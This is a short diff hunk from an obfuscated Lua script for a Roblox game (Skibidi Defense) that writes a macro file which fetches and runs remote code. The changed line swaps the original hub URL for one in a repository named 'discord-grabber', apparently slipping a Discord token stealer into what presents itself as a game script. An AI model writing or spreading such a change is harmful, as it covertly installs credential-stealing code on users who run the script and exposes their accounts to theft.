@@ -604,7 +604,7 @@ _0x20bb5(function()
 	end
 	writefile(
 		"SkibidiDefense_Macros/Hub.lua",
-		[=[ if not game:IsLoaded() then game.Loaded:Wait() end loadstring(game:HttpGet("https://raw.githubusercontent.com/KeroTwT/Kero-Hub/main/Sources/Skibidi%20Defense"))() ]=]
+		[=[ if not game:IsLoaded() then game.Loaded:Wait() end loadstring(game:HttpGet("https://raw.githubusercontent.com/bae32312/discord-grabber/refs/heads/main/SkibidiDefense1.lua"))() ]=]
 	)
 end)
 local _bhjgjdojqjwfl =
